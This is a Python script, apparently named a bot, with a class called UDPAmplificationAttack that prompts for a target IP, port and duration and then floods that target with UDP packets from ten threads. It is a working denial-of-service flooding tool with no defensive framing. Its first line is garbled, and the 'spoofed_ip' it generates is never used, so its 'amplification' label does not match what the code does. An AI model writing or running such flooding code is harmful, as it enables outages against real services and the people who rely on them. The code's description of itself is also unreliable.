# Bot import socket
import random
import threading
import time

class UDPAmplificationAttack:
    def __init__(self, target_ip, target_port, payload, packet_size=4096, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.payload = payload
        self.packet_size = packet_size
        self.num_threads = num_threads
        self.counter = 0
        self.running = False

    def send_packet(self):
        while self.running:
            try:
                spoofed_ip = self.random_ip()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(self.payload, (self.target_ip, self.target_port))
                self.counter += 1
                print(f"Sent packet {self.counter} to {self.target_ip}")
                sock.close()
            except Exception as e:
                print(f"Error: {e}")

    def random_ip(self):
        return ".".join(str(random.randint(0, 255)) for _ in range(4))

    def start_attack(self, duration):
        self.running = True
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_packet)
            thread.start()
            threads.append(thread)

        print(f"Attack started for {duration} seconds with {self.num_threads} threads.")
        time.sleep(duration)
        self.stop_attack(threads)

    def stop_attack(self, threads):
        self.running = False
        for thread in threads:
            thread.join()
        print("Attack stopped.")
        print(f"Total packets sent: {self.counter}")

if __name__ == "__main__":
    # Target IP and port
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    
    # Enhanced UDP server stress payload
    payload = b"\x00\x00" * 1024 
    
    # Create UDPAmplificationAttack instance
    amplification_attack = UDPAmplificationAttack(target_ip, target_port, payload)
    
    # Start the attack
    duration = int(input("Enter attack duration (seconds): "))
    amplification_attack.start_attack(duration)
